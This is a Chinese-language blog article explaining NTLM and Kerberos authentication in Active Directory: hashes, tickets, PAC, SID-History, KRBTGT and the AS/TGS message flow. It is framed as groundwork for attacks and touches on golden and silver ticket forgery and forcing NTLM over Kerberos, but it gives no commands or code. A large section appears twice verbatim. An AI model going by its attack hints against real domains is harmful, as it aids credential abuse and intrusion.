深入了解Kerberos & Windows认证攻击

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-7987b75d91f349e49cbc331b72ceecc2.png)

> 此篇文章是在上一篇文章[《浅谈Kerberos&Windows认证》](./浅识Kerberos&windows认证)的基础上进行深入学习与研究的。全文约一万字，预计阅读时间40分钟。



**该文章发布与2021年9月1日，在2022年2月11日对部分容易混淆/不正确的内容进行了修改，并将一些内容进行了整合**



## Basic Knowledge

> 一些基础知识，在这篇文章	中引用了很多来自互联网的资源，**重复内容不再赘述**，只标出一些重点。



#### NTLM

NTLM(NT LAN Manager)是一个**认证协议**，可以被Windows服务使用，以验证客户端/用户的身份。NTLM是在[NTLM SSP](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)中实现的，除了认证之外，它还允许通过签署和/或加密信息来保护通信。

这里有一些概念，是被大家经常搞混淆的一些内容

- **NTLM** - 用于验证远程机器用户的网络协议。它也被称为Net-NTLM
- **NTLMv1** - NTLM的第一个版本。它也被称为Net-NTLMv1
- **NTLMv2** - NTLMv2。NTLM的第二个版本，它与NTLMv1的不同之处在于会话密钥和NTLM哈希的计算方式。它也被称为Net-NTLMv2
- **NTLM2** - 是NTLMv1的安全性加强版本，但仍然比NTLMv2弱
- **NTLMv1 hash** - 由NTLMv1协议创建的NTLM哈希值
- **NTLMv2 hash** - 由NTLMv2协议创建的NTLM哈希值
- **NT hash** - 从用户密码衍生出来的哈希值，作为NTLM认证的secret(被加密的明文)。**经常被称之为 NTLM hash ，但是容易被混淆为NTLM**,也是被现代Windows系统存储的密码，存储在SAM、NTDS数据库中，可以用来进行PTT，算法:MD4(UTF-16-LE(密码))
- **LM Hash** - 是 Windows 使用的最古老的密码存储，DES密钥为固定的硬编码，十分容易被破解，已经被淘汰，Windows Vista/Server 2008 开始，LM 默认关闭
- **NTLM hash/response** - 对服务器挑战的响应(挑战应答模式)，由NT hash计算得出，也被称为Net-NTLM hash和NTLM response
- **LM Response** - 对服务器挑战的响应(挑战应答模式)，由LM hash计算得出，已过时
- LMv1 - LM响应的第一个版本
- Lmv2 - LM响应的第二个版本

更多详细内容 《[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/#lm-nt-hashes)》、《[LM, NTLM, Net-NTLMv2, oh my!](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)》



#### Kerberos

[Kerberos](https://tools.ietf.org/html/rfc4120) 是 Active Directory 网络中域帐户的首选身份验证**协议**(不能在工作组中使用)。它由 [Kerberos SSP](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-ssp) 实现。 Kerberos 在 [RFC 4120](https://tools.ietf.org/html/rfc4120) 中进行了描述，Active Directory 中使用的扩展在 [MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9) 文档中进行了说明。

这里是关于Kerberos的[详细内容](https://www.tarlogic.com/blog/how-kerberos-works/)

要为一个服务申请一个ticket(票据)，就必须指定该服务的[SPN](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)，NT-SRV-INST、NT-SRV-HST或NT-SRV-XHST  [Kerberos principals](https://datatracker.ietf.org/doc/html/rfc4120#section-6.2) 类型可以用来请求服务，换句话说，**要使用Kerberos协议进行身份认证，必须要服务拥有SPN，且使用了主机名指向目标(因为Kerberos需要主机名来识别机器服务)**。

>Service Principal Name (SPN) 中文名:服务主体名称
>
>SPN是 **服务实例** 的 **唯一标识** ，简单来讲，他像是一种主机和主机上所运行服务的映射，主要标识**每个主机上**所运行的服务，以便客户端与Kerberos KDC 快速定位查找所访问的服务坐标。
>
>它的格式规范如下:
>
><service class>/<host>:<port>/<service name>
>#以exchange服务做例子
>exchangeMDB/MAIL.ONEBIT.TK  #host必须大写
>
>其中port以及Service name是可选选项
>[详细内容](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

Q:如何bypass Kerberos协议 而是用 NTLM协议进行身份认证？

A:通过指定的IP地址而不是主机名连接目标

**Kerberos ``只是一种身份验证协议`` 而不是一种授权验证，授权验证作用是由Active Directory作为支撑的，在这个Active Directory中，Kerberos 提供有关每个用户权限的信息，但Active Directory中的每个服务都有责任确定用户是否有权访问其资源。**



#### Kerberos **Agents**

多个Agent一起工作以在 Kerberos 中提供身份验证：

- 客户端/用户 - 想要访问服务的客户端或用户
- AP(应用服务器 )- 提供用户所需的服务
- KDC(密钥分发中心)- ，Kerberos 的主要服务，负责签发票证，安装在 DC(域控制器)上
  - AD (Account Database) - 账户数据库，用来验证客户端/用户是否可信，是AD(活动目录)上的组件，**它并不属于KDC**
  - AS (Authentication Service) - 身份验证服务，KDC的组件，
  - TGS (Ticket Granting Service) - 票据授予服务 , KDC的组件，经常被 与 STs (Service tickets)搞混，**在许多其他出版物中，STs被称为TGSs** 

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-7584c3643c0849aa88d9358bef80cc26.png)



#### Kerberos加密密钥

> Kerberos 在设计理念之初，就是为了防止用户密码和Hash在网络上明文传输，所以这些票证中许多结构都经过加密或签名，以防止被第三方篡改。这些密钥如下：

- **krbtgt key** -  从 krbtgt 帐户(也是Kerberos服务账户)NT hash (NTLM hash)派生的 KDC 或 krbtgt 密钥
- **User Key** - 从用户 NT hash(NTLM hash)派生的用户密钥
- **Service key** - 从服务所有者的 NT hash(NTLM hash)派生的服务密钥，服务所有者可以是用户或计算机帐户
- **Session key** - 用户和 KDC 之间协商的会话密钥
- **Service session key** - 在用户和服务之间使用的服务会话密钥

#### Kerberos 票据

Kerberos 票据中的部分是被加密的，其中包括

- 票据所适用的**目标**委托人(通常是服务)
- 与客户端/用户有关的信息，如名称和域名
- 用于在客户端和服务之间建立安全通道的密钥
- 时间戳，用于确定票据的有效期，以及防篡改



Kerberos票据按照类型一般分为两种

- Service tickets - 服务票据，很多文章中将它称为 TGSs，但是会与提供Service tickets的服务 - **TGS** (Ticket Granting Service) 混淆
- TGT - Ticket Granting Ticket 票据授予票据，使用KDC 密钥(krbtgt的NT hash)加密，是提交给 KDC 以请求 Service tickets 的票证，当拥有了krbtgt密钥后，便可以生成冒充任意客户端的TGT(金票)，但是TGT只是用户提供自身票据证明身份的结果，这不意味着所有TGT都是金票。



```
Ticket 票据          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] 整数、版本号 (5),
        realm           [1] Kerberos领域,就是AD域
        sname           [2] 主体名, -- 通常情况下是SPN
        enc-part        [3] 加密数据 -- EncTicketPart,加密的票据部分
}

EncTicketPart 加密的票据部分   ::= [APPLICATION 3] SEQUENCE {
        flags                   [0] ,
        key                     [1] 加密密钥, -- Session Key
        crealm                  [2] Kerberos领域/AD域,
        cname                   [3] 主体名,-- 通常情况下是SPN
        transited               [4] TransitedEncoding 编码,
        authtime                [5] KerberosTime 开始认证的时间,
        starttime               [6] KerberosTime 票据开始时间 可选,
        endtime                 [7] KerberosTime 票据结束时间,
        renew-till              [8] KerberosTime 续约时间 可选,
        caddr                   [9] HostAddresses 主机地址 可选,
        authorization-data      [10] AuthorizationData 授权数据 可选 -- 包括PAC
}
```

<center>Kerberos在网络数据包中的呈现方式</center>



#### PAC

> Privilege Attribute Certificate (PAC)中包含了一系列账户的信息及权限，类似User RID、Group RID、SID、用户名等。
> 以下是Kerberos PAC数据包中的详细内容
> 相关知识内容也可以参考[**此篇文章**](http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html)



PAC(权限属性证书)包含与客户相关的安全信息。
- 客户端域。包括域名和SID(分别为LogonDomainName和LogonDomainId)
- 客户端用户。用户名和用户RID(分别为EffectiveName和UserId)
- 客户组。用户所属的那些域组的RIDs(GroupIds)。
- 其他组。PAC包括参考非域组的其他SID(ExtraSids)，可以应用于域间认证，以及用于表示特殊特征的知名SID。

除了用户信息外，PAC还[包括](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6e95edd3-af93-41d4-8303-6c7955297315)几个签名，用于验证PAC和票据数据的完整性。
- [Server signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098):服务器签名。用用于加密票据的同一密钥创建的PAC内容的签名。
- [KDC signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec):KDC 签名。用 KDC 密钥创建的服务器签名的签名。这可用于检查 PAC 是由 KDC 创建的，并防止银票攻击，**但不被检查**。
- [Ticket signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/76c10ef5-de76-44bf-b208-0d8750fc2edd):票据签名。用KDC密钥创建的票据内容的签名。这种签名最近被引入，以防止CVE-2020-17049青铜位攻击。

PAC解密后看起来像是这样:

```
AuthorizationData item
    ad-type: AD-Win2k-PAC (128)
        Type: Logon Info (1)
            PAC_LOGON_INFO: 01100800cccccccce001000000000000000002006a5c0818...
                Logon Time: Aug 17, 2018 16:25:05.992202600 Romance Daylight Time
                Logoff Time: Infinity (absolute time)
                PWD Last Set: Aug 16, 2018 14:13:10.300710200 Romance Daylight Time
                PWD Can Change: Aug 17, 2018 14:13:10.300710200 Romance Daylight Time
                PWD Must Change: Infinity (absolute time)
                Acct Name: pixis
                Full Name: pixis
                Logon Count: 7
                Bad PW Count: 2
                User RID: 1102
                Group RID: 513
                GROUP_MEMBERSHIP_ARRAY
                    Referent ID: 0x0002001c
                    Max Count: 2
                    GROUP_MEMBERSHIP:
                        Group RID: 1108
                        Attributes: 0x00000007
                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET
                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET
                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET
                    GROUP_MEMBERSHIP:
                        Group RID: 513
                        Attributes: 0x00000007
                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET
                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET
                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET
                User Flags: 0x00000020
                User Session Key: 00000000000000000000000000000000
                Server: DC2016
                Domain: HACKNDO
                SID pointer:
                    Domain SID: S-1-5-21-3643611871-2386784019-710848469  (Domain SID)
                User Account Control: 0x00000210
                    .... .... .... ...0 .... .... .... .... = Don't Require PreAuth: This account REQUIRES preauthentication
                    .... .... .... .... 0... .... .... .... = Use DES Key Only: This account does NOT have to use_des_key_only
                    .... .... .... .... .0.. .... .... .... = Not Delegated: This might have been delegated
                    .... .... .... .... ..0. .... .... .... = Trusted For Delegation: This account is NOT trusted_for_delegation
                    .... .... .... .... ...0 .... .... .... = SmartCard Required: This account does NOT require_smartcard to authenticate
                    .... .... .... .... .... 0... .... .... = Encrypted Text Password Allowed: This account does NOT allow encrypted_text_password
                    .... .... .... .... .... .0.. .... .... = Account Auto Locked: This account is NOT auto_locked
                    .... .... .... .... .... ..1. .... .... = Don't Expire Password: This account DOESN'T_EXPIRE_PASSWORDs
                    .... .... .... .... .... ...0 .... .... = Server Trust Account: This account is NOT a server_trust_account
                    .... .... .... .... .... .... 0... .... = Workstation Trust Account: This account is NOT a workstation_trust_account
                    .... .... .... .... .... .... .0.. .... = Interdomain trust Account: This account is NOT an interdomain_trust_account
                    .... .... .... .... .... .... ..0. .... = MNS Logon Account: This account is NOT a mns_logon_account
                    .... .... .... .... .... .... ...1 .... = Normal Account: This account is a NORMAL_ACCOUNT
                    .... .... .... .... .... .... .... 0... = Temp Duplicate Account: This account is NOT a temp_duplicate_account
                    .... .... .... .... .... .... .... .0.. = Password Not Required: This account REQUIRES a password
                    .... .... .... .... .... .... .... ..0. = Home Directory Required: This account does NOT require_home_directory
                    .... .... .... .... .... .... .... ...0 = Account Disabled: This account is NOT disabled
```

![PAC](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/pac.png)

<center>使用PAC标识权限的示意图</center>



![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-36f743b7e58e469dbe68436498c37907.png)

<center>PAC数据包(解密后)</center>





#### SID

> SID(安全标识符)是用于标识 [**受信者**](https://docs.microsoft.com/zh-cn/windows/win32/secauthz/trustees) 的唯一值。每个委托人(**[principal](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals)**)都有一个由机构(例如域控)颁发的唯一SID，并存储在安全数据库中(AD数据库)。

SID一般分为三种

- 域SID(**Domain SID**) - 域SID用来识别域，也是该域委托人SID的基础
- 委托人SID (**Principal SID**) - 委托人SID用于识别委托人。它由域的SID和一个委托人的[RID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_df3d0b61-56cd-4dac-9402-982f1fedc41c)（相对标识符）组成。该委托人可以是用户，组等，例子:`<SID>-<RID> `类似` S-1-5-21-1372086773-2238746523-2939299801-1103`最后4位为用户RID

其中有一些[众所周知且固定的SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers)

> 用户 每次登录时，系统都将从数据库中检索该用户的SID，并将其放在该用户的[访问令牌](https://docs.microsoft.com/zh-cn/windows/win32/secgloss/a-gly)中。系统使用访问令牌中的SID来识别与windows安全性的所有后续交互的用户是哪一个用户。
> 一句话来说：每个用户都有自己的SID，SID的主要作用是系统识别和跟踪用户连接资源的访问权限。



#### 服务账户(Service Account)

> [服务账户](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn617203(v=ws.11)?redirectedfrom=MSDN)是用于运行服务或应用程序的"non-human"账户，服务账户不是管理员或是其他交互账户，它仅用于运行服务或是应用程序，一般服务账户末尾带有$的标识(账户将会被隐藏)，他们保存在AD数据库中，但他们通常还拥有对计算机、应用程序和数据的特殊访问权限，所以对攻击者非常有价值。
> **服务账户利用SPN来支持Kerberos身份验证** 
> **服务账户一般设定密码不更新，因为更新密码可能会导致服务中断** 



#### 信任账户(Trust accounts)

> 当一个域信任被建立时，在每个域中都会自动创建一个相关的用户对象来存储信任密钥。该用户的名字是其他域的NetBIOS名称，以$结束(类似于计算机账户名)。例如，在FOO域和BAR域之间建立信任的情况下，FOO域将在BAR$用户中存储信任密钥，而BAR域将在FOO$用户中存储。





#### 域迁移

> 例如一家公司收购另一家公司、业务部门或者产品线时，收购它的公司可能还想从卖方那里获得对应的IT资产和现成的网络环境。具体来说，购买者可能想要获得一些或所有域控制器，这些域控制器托管着要购买的业务资产和相对应的用户帐户、计算机帐户或安全组。
> 那么，买方获取存储在卖方 Active Directory 林中的 IT 资产的唯一支持方法就是将卖方的林或域迁移到买方的域中。
> 详细见[Microsoft文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc786927(v=ws.10))



#### SID-History

> [SID History](https://msdn.microsoft.com/en-us/library/ms679833(v=vs.85).aspx)是一个支持迁移方案(类似域迁移)的属性，每个用户帐户都有一个关联的[安全标识符 (SID)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379571(v=vs.85).aspx)，用于跟踪安全主体和帐户在连接到资源时的访问权限。SID 历史记录允许将一个帐户的 **访问权限** 有效地 **克隆** 到 **另一个帐户** (标识曾经的权限)。这用于确保用户在从一个域移动(迁移)到另一个域时 能够**保留访问权限** 。由于创建新帐户时用户的 SID 发生了变化， **因此旧 SID 需要映射到新的 SID** 。当域 A 中的用户迁移到域 B 时，会在域 B 中创建一个新用户帐户，并将域 A 用户的 SID 添加到域 B 用户帐户的 SID-History **属性** 中。这确保了 Domain B 用户仍然可以访问 Domain A 中的资源。
> 简单来说: **SID-History的作用就是去将旧用户的SID标识和权限映射到新用户上** 。



#### KRBTGT账户

> AD域中的每个DC都运行KDC(Kerberos Distribution Center)**服务**，该服务处理所有Kerberos票证请求。AD将AD域中的KRBTGT账户用于Kerberos验证、加密、签名，他是一个域账户，每个可写的域控都知道账户密码，且百分之99的管理员都不会更改KRBTGT账户的密码(其实是因为操作繁琐)，KRBTGT账户的SID的一部分永远是固定的: S-1-5-<域>-502，账户名称无法更改删除.
> 详细:[Kerberos & KRBTGT: Active Directory’s Domain Kerberos Service Account](https://adsecurity.org/?p=483)

**简单来说，krbtgt是用于启动kerberos服务的服务账户，一般也称之为KDC账户和kerberos账户**



#### SPN

> Service Principal Name (SPN) 中文名:服务主体名称
> SPN是 **服务实例** 的 **唯一标识** ，简单来讲，他像是一种主机和主机上所运行服务的映射，主要标识**每个主机上**所运行的服务，以便客户端与Kerberos KDC 快速定位查找所访问的服务坐标。
> 它的格式规范如下:
> 其中port以及Service name是可选选项
> [详细内容](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

```
<service class>/<host>:<port>/<service name>
#以exchange服务做例子
exchangeMDB/MAIL.ONEBIT.TK  #host必须大写
```



#### UPN

> User Principal Name (UPN) 中文名:用户主体名称，与SPN类似，但不是必选项，可以自行设置用户的UPN
> [详细内容](https://social.technet.microsoft.com/wiki/contents/articles/52250.active-directory-user-principal-name.aspx)


#### Kerberos

[Kerberos](https://tools.ietf.org/html/rfc4120) 是 Active Directory 网络中域帐户的首选身份验证**协议**(不能在工作组中使用)。它由 [Kerberos SSP](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-ssp) 实现。 Kerberos 在 [RFC 4120](https://tools.ietf.org/html/rfc4120) 中进行了描述，Active Directory 中使用的扩展在 [MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9) 文档中进行了说明。

这里是关于Kerberos的[详细内容](https://www.tarlogic.com/blog/how-kerberos-works/)

要为一个服务申请一个ticket(票据)，就必须指定该服务的[SPN](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)，NT-SRV-INST、NT-SRV-HST或NT-SRV-XHST  [Kerberos principals](https://datatracker.ietf.org/doc/html/rfc4120#section-6.2) 类型可以用来请求服务，换句话说，**要使用Kerberos协议进行身份认证，必须要服务拥有SPN，且使用了主机名指向目标(因为Kerberos需要主机名来识别机器服务)**。

>Service Principal Name (SPN) 中文名:服务主体名称
>
>SPN是 **服务实例** 的 **唯一标识** ，简单来讲，他像是一种主机和主机上所运行服务的映射，主要标识**每个主机上**所运行的服务，以便客户端与Kerberos KDC 快速定位查找所访问的服务坐标。
>
>它的格式规范如下:
>
><service class>/<host>:<port>/<service name>
>#以exchange服务做例子
>exchangeMDB/MAIL.ONEBIT.TK  #host必须大写
>
>其中port以及Service name是可选选项
>[详细内容](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

Q:如何bypass Kerberos协议 而是用 NTLM协议进行身份认证？

A:通过指定的IP地址而不是主机名连接目标

**Kerberos ``只是一种身份验证协议`` 而不是一种授权验证，授权验证作用是由Active Directory作为支撑的，在这个Active Directory中，Kerberos 提供有关每个用户权限的信息，但Active Directory中的每个服务都有责任确定用户是否有权访问其资源。**



#### Kerberos **Agents**

多个Agent一起工作以在 Kerberos 中提供身份验证：

- 客户端/用户 - 想要访问服务的客户端或用户
- AP(应用服务器 )- 提供用户所需的服务
- KDC(密钥分发中心)- ，Kerberos 的主要服务，负责签发票证，安装在 DC(域控制器)上
  - AD (Account Database) - 账户数据库，用来验证客户端/用户是否可信，是AD(活动目录)上的组件，**它并不属于KDC**
  - AS (Authentication Service) - 身份验证服务，KDC的组件，
  - TGS (Ticket Granting Service) - 票据授予服务 , KDC的组件，经常被 与 STs (Service tickets)搞混，**在许多其他出版物中，STs被称为TGSs** 

![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-7584c3643c0849aa88d9358bef80cc26.png)



#### Kerberos加密密钥

> Kerberos 在设计理念之初，就是为了防止用户密码和Hash在网络上明文传输，所以这些票证中许多结构都经过加密或签名，以防止被第三方篡改。这些密钥如下：

- **krbtgt key** -  从 krbtgt 帐户(也是Kerberos服务账户)NT hash (NTLM hash)派生的 KDC 或 krbtgt 密钥
- **User Key** - 从用户 NT hash(NTLM hash)派生的用户密钥
- **Service key** - 从服务所有者的 NT hash(NTLM hash)派生的服务密钥，服务所有者可以是用户或计算机帐户
- **Session key** - 用户和 KDC 之间协商的会话密钥
- **Service session key** - 在用户和服务之间使用的服务会话密钥

#### Kerberos 票据

Kerberos 票据中的部分是被加密的，其中包括

- 票据所适用的**目标**委托人(通常是服务)
- 与客户端/用户有关的信息，如名称和域名
- 用于在客户端和服务之间建立安全通道的密钥
- 时间戳，用于确定票据的有效期，以及防篡改



Kerberos票据按照类型一般分为两种

- Service tickets - 服务票据，很多文章中将它称为 TGSs，但是会与提供Service tickets的服务 - **TGS** (Ticket Granting Service) 混淆
- TGT - Ticket Granting Ticket 票据授予票据，使用KDC 密钥(krbtgt的NT hash)加密，是提交给 KDC 以请求 Service tickets 的票证，当拥有了krbtgt密钥后，便可以生成冒充任意客户端的TGT(金票)，但是TGT只是用户提供自身票据证明身份的结果，这不意味着所有TGT都是金票。



```
Ticket 票据          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] 整数、版本号 (5),
        realm           [1] Kerberos领域,就是AD域
        sname           [2] 主体名, -- 通常情况下是SPN
        enc-part        [3] 加密数据 -- EncTicketPart,加密的票据部分
}

EncTicketPart 加密的票据部分   ::= [APPLICATION 3] SEQUENCE {
        flags                   [0] ,
        key                     [1] 加密密钥, -- Session Key
        crealm                  [2] Kerberos领域/AD域,
        cname                   [3] 主体名,-- 通常情况下是SPN
        transited               [4] TransitedEncoding 编码,
        authtime                [5] KerberosTime 开始认证的时间,
        starttime               [6] KerberosTime 票据开始时间 可选,
        endtime                 [7] KerberosTime 票据结束时间,
        renew-till              [8] KerberosTime 续约时间 可选,
        caddr                   [9] HostAddresses 主机地址 可选,
        authorization-data      [10] AuthorizationData 授权数据 可选 -- 包括PAC
}
```

<center>Kerberos在网络数据包中的呈现方式</center>



#### PAC

> Privilege Attribute Certificate (PAC)中包含了一系列账户的信息及权限，类似User RID、Group RID、SID、用户名等。
> 以下是Kerberos PAC数据包中的详细内容
> 相关知识内容也可以参考[**此篇文章**](http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html)



PAC(权限属性证书)包含与客户相关的安全信息。
- 客户端域。包括域名和SID(分别为LogonDomainName和LogonDomainId)
- 客户端用户。用户名和用户RID(分别为EffectiveName和UserId)
- 客户组。用户所属的那些域组的RIDs(GroupIds)。
- 其他组。PAC包括参考非域组的其他SID(ExtraSids)，可以应用于域间认证，以及用于表示特殊特征的知名SID。

除了用户信息外，PAC还[包括](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6e95edd3-af93-41d4-8303-6c7955297315)几个签名，用于验证PAC和票据数据的完整性。
- [Server signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/a194aa34-81bd-46a0-a931-2e05b87d1098):服务器签名。用用于加密票据的同一密钥创建的PAC内容的签名。
- [KDC signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3122bf00-ea87-4c3f-92a0-91c0a99f5eec):KDC 签名。用 KDC 密钥创建的服务器签名的签名。这可用于检查 PAC 是由 KDC 创建的，并防止银票攻击，**但不被检查**。
- [Ticket signature](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/76c10ef5-de76-44bf-b208-0d8750fc2edd):票据签名。用KDC密钥创建的票据内容的签名。这种签名最近被引入，以防止CVE-2020-17049青铜位攻击。



![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-36f743b7e58e469dbe68436498c37907.png)






### Extended Knowledge



### Kerberos 票证流程概述



**下文中所有名为TGS的票证均为STs(Service tickets)**



#### Kerberos 验证消息

- **KRB_AS_REQ**:用于向 KDC 请求 TGT
- **KRB_AS_REP**:用于由 KDC 传递 TGT
- **KRB_TGS_REQ**:用于使用 TGT向 KDC 请求 Service tickets
- **KRB_TGS_REP**: 用于由 KDC 交付 Service tickets
- **KRB_AP_REQ**:用于使用 Service tickets 针对服务对用户进行身份验证
- **KRB_AP_REP**: （可选）由服务用来针对用户标识自己
- **KRB_ERROR**:传达错误情况的消息


**注意，接下来提到的身份验证器中根据需求包括以下内容**

- 时间戳
- 客户端 ID
- 特定应用的校验位
- 初始序列号KRB_SAFE或KRB_PRIV信息
- 会话子密钥（在谈判中用于该特定会话的唯一会话密钥）



#### 详细kerberos验证流程



![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-e0cf40a902224a5dacbd1a26df2bd91c.png)

<center>Kerberos认证简略流程图</center>



Note: **上图中的序号与下文中的序号无关联**



1. 客户端向 Kerberos KDC 发送 `KRB-AS-REQ` 以证明自己是**可信**的



> 此AS-REQ数据包中包含
>
> - 使用客户端密钥(NT hash)加密的时间戳等[预认证数据](https://datatracker.ietf.org/doc/html/rfc4120#section-7.5.2)（包含PA-PAC-REQUEST结构），用于防止重放攻击 - padata
> - 经过身份验证的用户的用户名 - cname
> - 与 krbtgt 帐户关联的服务 SPN - sname
> - 用户生成的**随机数** - nonce
> - 一些Client Info 与 Server Info，用来定位AD数据库中的Client NT Hash 与 目标服务 - realm
> - KDC时间和一些其他内容
>
> Client Info 与 Server Info 是一些属性的合集。(Client Info的作用就是标识和定位客户端信息以及查找在KDC数据库中的Client NT Hash)

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/KRB_AS_REQ.png)

<center>KRB-AS-REQ</center>



![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/1PIAIf3BcgvOwoz9HTv92Pw.png)

<center>KRB_AS_REQ数据包</center>



2. 域控中的Kerberos服务(KDC)接收到身份验证请求，从AD数据库中查找 **被认证** 用户的NT Hash作为密钥解密`PREAUTH data`，验证数据和时间戳后，KDC调用AD检查用户信息(登录权限、组成员身份等权限信息)，验证通过后向客户端发送 **包含TGT** 的数据包(KRB-AS-REP)给用户。

   TGT中包含一个特权属性证书([PAC](https://docs.microsoft.com/zh-cn/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation))，其中包含用户所属的所有安全组和其他权限信息，TGT由KDC服务账户(KRBTGT)的NT Hash作为密钥进行加密和签名，只有域中KRBTGT账户才能够解密和读取TGT中的数据。

   

> KRB-AS-REP包括：
>
> - 用户名及一些Client / Server Info
> - 由KDC服务账户(KRBTGT)的NT Hash作为密钥进行加密的TGT，其中包括：
>   - 用户名 
>   - Session Key
>   - TGT到期时间
>   - 该用户的PAC，由KDC签名
> - 一些由受信 客户端/用户 的**用户密钥**加密的数据，其中包括:
>   - Session Key
>   - TGT到期时间
>   - 用户之前生成的随机数，防止重放攻击
>
> 
>
> KRB-AS-REP数据包其中一个TGT Session Key是通过用户的NT Hash作为密钥进行加密的，以保证用户可以与Ticket Granting Service(TGS服务)进行通信，另一个TGT Session Key是由Kerberos用户 (KRBTGT)的NT Hash进行加密的(包含在TGT中)，只能使用KRBTGT用户的NT Hash作为密钥解密，用于验证客户端(用户)的Session Key是否一致

![img](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/KRB_AS_REP.png)

<center>KRB_AS_REP</center>



![image.png](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-cd41b974943041068fd76e3e756493cb.png)

<center>KRB_AS_REP数据包</center>



3.  当用户打开带有服务请求的应用(例如:outlook---exchange邮箱服务)时，会向Kerberos发送KRB-TGS-REQ请求，请求TGS(票据授予服务) 给予服务票据(Services/TGS Ticket)从而对服务进行访问。

> 首先客户端定位目标地址(例如:MetcorpEXMB02.ADSecurity.org的Excheage邮箱服务器)及SPN,KDC读取AD数据库中服务所在计算机中的ServicePrincipalName(SPN)属性与服务账户的对应关系(例如图中该SPN为:MAIL/cliff.medin.local，对应的账户为:mailsvc)
>
> 之后，客户端向KDC发送KRB-TGS-REQ，请求Services Ticket以访问在MetcorpEXMB02 Exchange服务器上运行的Exchange服务。
>
> KRB-TGS-REQ请求包括:
>
> - 使用用户NT hash加密的时间戳
>
> - 使用KRB-AS-REP中获取的TGT Session Key加密的数据
>   - 用户名
>   - 身份验证器（由时间戳和Client Info组成）
> - TGT (使用KRBTGT账户NT HASH加密)
> - SPN
> - 用户生成的随机数，用于校验数据完整性和防止重放攻击

![image-20211123150811898](../assets/2021-09-01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Kerberos&Windows%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/image-20211123150811898.png)

<center>简单的流程示意图</center>

